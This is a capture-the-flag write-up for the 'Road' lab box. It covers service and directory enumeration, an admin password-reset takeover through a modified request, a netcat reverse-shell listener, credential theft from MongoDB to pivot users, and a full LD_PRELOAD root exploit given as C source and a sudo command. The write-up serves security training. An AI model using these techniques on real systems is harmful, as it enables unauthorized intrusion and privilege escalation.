# Road
- **Category:** Web / Privilege Escalation
- **Difficulty:** Medium
- **CTF / Lab:** Road
- **Target:** 10.48.132.160
- **Date:** 2025-12-17

## 1. Challenge Description
The target system `10.48.132.160` hosts a web application named **Sky Couriers**.  
The objective of the challenge is to enumerate services, identify exposed endpoints, exploit weak authentication and reset mechanisms, gain shell access, and escalate privileges to root.

Key points:
- Service discovery via Nmap revealed SSH and HTTP ports.
- Web enumeration exposed `/phpMyAdmin/` and `/v2/admin/login.html`.
- Functionality included login, profile editing, and password reset features.
- Goal: Extract user and root flags through exploitation and privilege escalation.

## 2. Approach
The strategy was to start with broad enumeration and progressively narrow down to exploitation:

- **Service Discovery:** Run Nmap scans to identify open ports, services, and OS details.
- **Web Enumeration:** Use directory brute-forcing tools (e.g., dirsearch) to uncover hidden endpoints like `/phpMyAdmin/` and `/v2/admin/login.html`.
- **Application Analysis:** Explore login, profile, and reset features to identify weak authentication and insecure functionality.
- **Exploitation:** Manipulate password reset requests via Burp Suite to gain access.
- **Shell Access:** Establish a reverse shell from the vulnerable web application.
- **Privilege Pivot:** Extract credentials from MongoDB and pivot from `www-data` to `webdeveloper`.
- **Privilege Escalation:** Compile and inject a malicious shared object using LD_PRELOAD to escalate privileges to root.
- **Flag Extraction:** Collect user and root flags from the target system.

## 3. Step-by-Step Solution
### 🔍 Enumeration with Nmap
Command:
nmap -Pn -sC -sV -O 10.48.132.160

Results:
- 22/tcp → SSH (OpenSSH 8.2p1 Ubuntu)
- 80/tcp → HTTP (Apache httpd 2.4.41, Ubuntu)
- Web Title: Sky Couriers
- OS Details: Linux 4.x kernel

Command:
nmap -Pn --script=http-enum -sV -p80 -O 10.48.132.160

Results:
- Found /phpMyAdmin/ endpoint
- Found /v2/ directory with admin functionality

### 🌐 Directory Enumeration
Command:
dirsearch -u http://10.48.132.160/ -w /usr/share/dirb/wordlists/common.txt

Results:
- /assets/
- /phpMyAdmin/
- /v2/
- /v2/admin/login.html
- /v2/profile.php
- /v2/ResetUser.php

### 🔐 Web Application Analysis
Observed Endpoints:
- Login page → /v2/admin/login.html
- Profile editing → /v2/profile.php
- Password reset → /v2/ResetUser.php

### 📡 Exploitation via Burp Suite
Initial Request (normal user):
POST /v2/lostpassword.php
uname=<user>
npass=<newpass>
cpass=<newpass>
ci_csrf_token=<token>
send=Submit

Response:
Password changed. Taking you back...

Modified Request (admin account):
POST /v2/lostpassword.php
uname=<admin>
npass=<newpass>
cpass=<newpass>
ci_csrf_token=<token>
send=Submit

Response:
Password changed. Taking you back...
Administrator credentials reset → elevated access to dashboard

### 🐚 Reverse Shell Access
Listener:
nc -lvnp 1234

Result:
- Connection received from target
- Shell as www-data

Upgrade shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

### 👤 Privilege Pivot: www-data → webdeveloper
MongoDB Enumeration:
mongo
use backup
show collections
db.users.find()

Results:
- Discovered stored credentials for another local user account

SSH Login:
ssh webdeveloper@10.48.132.160

Result:
- Successful login as webdeveloper
- Prompt: webdeveloper@ip-10-48-132-160:~$

### 🧑‍💻 User Flag
cd /home/webdeveloper
cat user.txt

Flag:
<redacted>

### 🔝 Privilege Escalation
Exploit source (root.c):
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

Compile and execute:
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/bin/sky_backup_utility

Result:
- Shell as root

Root Flag:
cd /root
cat root.txt
<redacted>

## 4. Evidence
Collected artifacts during exploitation and escalation:

- Nmap scan results showing open ports (22/SSH, 80/HTTP).
- Directory enumeration results revealing `/phpMyAdmin/` and `/v2/` endpoints.
- Burp Suite request/response logs demonstrating password reset manipulation.
- Reverse shell session transcript showing initial access as `www-data`.
- MongoDB query output revealing stored user credentials.
- SSH session evidence of pivot to `webdeveloper`.
- Source code and compilation logs of `root.c` exploit.
- Execution trace of LD_PRELOAD privilege escalation.

## 5. Flags
Flags were extracted but values are redacted for documentation purposes:

- **User Flag:** Located in `/home/webdeveloper/user.txt`
- **Root Flag:** Located in `/root/root.txt`

## 6. Lessons Learned
Key takeaways from the challenge:

- **Enumeration is critical:** Service and directory discovery exposed the attack surface.
- **Weak password reset mechanisms:** Lack of proper validation allowed privilege escalation to admin.
- **Database exposure:** MongoDB stored plaintext credentials, enabling lateral movement.
- **Privilege escalation via LD_PRELOAD:** Misconfigured sudo utility permitted root shell execution.
- **Documentation discipline:** Capturing commands, results, and evidence ensures reproducibility and professional reporting.
